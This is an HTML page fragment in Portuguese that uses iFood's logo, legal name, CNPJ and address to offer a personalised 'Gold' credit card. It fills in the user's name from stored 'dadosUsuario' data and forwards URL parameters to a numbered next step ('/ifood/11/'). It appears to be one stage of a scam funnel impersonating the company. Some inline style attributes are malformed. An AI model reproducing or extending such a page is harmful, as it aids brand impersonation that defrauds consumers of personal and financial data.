    <style>
        body {
        margin: 0;
        font-family: 'Inter', sans-serif;
        background-color: #ffffff;
        color: #333;
        text-align: center;
    }
        .header {
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 15px;
        background-color: #EA1D2C;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }
    .header img {
        width: 120px;
        height: auto;
        filter: brightness(0) invert(1);
    }
        .button {
        background-color: #EA1D2C;
        color: #ffffff;
        padding: 18px 30px;
        border-radius: 12px;
        font-family: 'Inter', sans-serif;
        font-weight: 600;
        font-size: 16px;
        cursor: pointer;
        width: 100%;
        text-decoration: none;
        display: inline-block;
        text-align: center;
        box-sizing: border-box;
        border: none;
        transition: all 0.3s ease;
        box-shadow: 0 4px 12px rgba(234, 29, 44, 0.3);
    }
        
    </style>
</head>
<body>
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/IFood_logo.svg/2560px-IFood_logo.svg.png" alt="Logo iFood" class="logo">
    </div>

    <div class="container">
        <h1 style="text-align: center; font-size: 20px;">Personalize o seu cartão</h1>

        <div class="color-options">
            <div class="color-option selected" style=; color: #ffffff;"background: linear-gradient(45deg, #EA1D2C, #EA1D2C)" onclick="changeCardColor('#EA1D2C', '#EA1D2C')"></div>
            <div class="color-option" style="background: linear-gradient(45deg, #FF0000, #FF6347)" onclick="changeCardColor('#FF0000', '#FF6347')"></div>
            <div class="color-option" style="background: linear-gradient(45deg, #00FF00, #32CD32)" onclick="changeCardColor('#00FF00', '#32CD32')"></div>
            <div class="color-option" style="background: linear-gradient(45deg, #2491ff, #1458e2)" onclick="changeCardColor('#2491ff', '#1458e2')"></div>
            <div class="color-option" style="background: linear-gradient(45deg, #FF1493, #FF69B4)" onclick="changeCardColor('#FF1493', '#FF69B4')"></div>
        </div>

        <script>
            function changeCardColor(color1, color2) {
                document.querySelector('.card').style.background = `linear-gradient(45deg, ${color1}, ${color2})`;
                
                // Atualiza a seleção visual
                document.querySelectorAll('.color-option').forEach(option => {
                    option.classList.remove('selected');
                });
                event.target.classList.add('selected');

                // Salva a cor selecionada no localStorage
                localStorage.setItem('cardColor', JSON.stringify({
                    color1: color1,
                    color2: color2
                }));
            }

            // Carrega a cor salva ao iniciar a página
            window.addEventListener('load', () => {
                const savedColor = localStorage.getItem('cardColor');
                if (savedColor) {
                    const {color1, color2} = JSON.parse(savedColor);
                    document.querySelector('.card').style.background = `linear-gradient(45deg, ${color1}, ${color2})`;
                }
            });
        </script>

<div class="card" style=; color: #ffffff;"background: linear-gradient(135deg, #EA1D2C, #EA1D2C); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative;">
    <!-- Efeito de brilho no cartão -->
    <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;"></div>
    <style>
        @keyframes shine {
            0% { left: -100%; }
            20% { left: 100%; }
            100% { left: 100%; }
        }
    </style>
    
    <div class="card-top">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/IFood_logo.svg/2560px-IFood_logo.svg.png" alt="Logo iFood" style="width: 100px; filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));">
        <div style="font-size: 12px; color: rgba(0,0,0,0.8); font-family: 'Inter', sans-serif; text- letter-spacing: 1px;">Gold</div>
    </div>
    
    <div style="position: absolute; top: 45%; left: 0;  width: 100%;">
        <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
            <div style="display: flex; align-items: center; margin-left: 20px;">
                <img src="chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));">
            </div>
            <i class="fas fa-wifi fa-rotate-90" style="color: rgb(0, 0, 0); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
        </div>
    </div>
    
    <div class="card-bottom">
        <div style="display: flex; flex-direction: column; align-items: flex-start;">
            <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">
                <script>
                    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
                    document.getElementById('cardName').textContent = dadosUsuario.NOME.toUpperCase();
                </script>
            </span>
            <span style="font-size: 8px; color: rgba(0,0,0,0.7); font-family: 'Inter', sans-serif; margin-top: 3px;">TITULAR DO CARTÃO</span>
        </div>
        <div style="display: flex; flex-direction: column; align-items: flex-end;">
            <img src="visa.png" alt="mastercard" style="width: 50px; filter: brightness(0);">
            <span style="font-size: 8px; color: rgba(0,0,0,0.7); font-family: 'Inter', sans-serif; margin-top: 3px; text-">Crédito</span>
        </div>
    </div>
    
    <!-- Padrão de segurança no fundo do cartão -->
    <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;"></div>
</div>

        <button onclick="window.location.href = buildUrlWithParams('/ifood/11/')" class="button"  style="background-color: #EA1D2C; color: #ffffff;">
            Continuar
        </button>

        <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Inter', sans-serif;">
            <div style="max-width: 600px; margin: 0 auto;">
                <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
                    iFood.com Agência de Restaurantes Online S.A. | CNPJ: 14.380.200/0001-21
                </p>
                <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
                    Rua Jasmin, 660 - Vila Madalena, São Paulo - SP, 05042-001
                </p>
                <p style="color: #999; font-size: 9px; margin-top: 5px;">
                    © 2025 - Todos os direitos reservados
                </p>
            </div>
        </footer>
    </div>

    <script>
            function getUrlParams() {
                const params = {};
                const queryString = window.location.search;
                const urlParams = new URLSearchParams(queryString);
                
                for (const [key, value] of urlParams) {
                    params[key] = value;
                }
                return params;
            }

            function buildUrlWithParams(baseUrl) {
                const params = getUrlParams();
                const url = new URL(baseUrl, window.location.href);
                Object.keys(params).forEach(key => {
                    url.searchParams.append(key, params[key]);
                });
                
                return url.toString();
            }
    </script>
